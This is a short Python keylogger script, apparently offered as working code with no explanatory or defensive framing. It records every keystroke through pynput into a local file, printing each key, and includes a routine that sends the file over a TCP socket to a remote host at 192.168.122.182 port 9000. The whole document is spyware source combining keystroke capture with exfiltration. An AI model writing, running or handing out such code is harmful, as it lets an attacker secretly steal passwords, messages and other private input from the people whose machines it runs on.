import socket
from pynput import keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            f.write(str(key))
        print(f"Key {str(key)} was pressed.")
    except Exception as e:
        print(e)

def on_release(key):
    return

def send_log():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect(("192.168.122.182", 9000))
            with open("keylogs.txt", "rb") as f:
                data = f.read(1024)
                while data:
                    s.sendall(data)
                    data = f.read(1024)
        except Exception as e:
            print(e)

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    send_log()
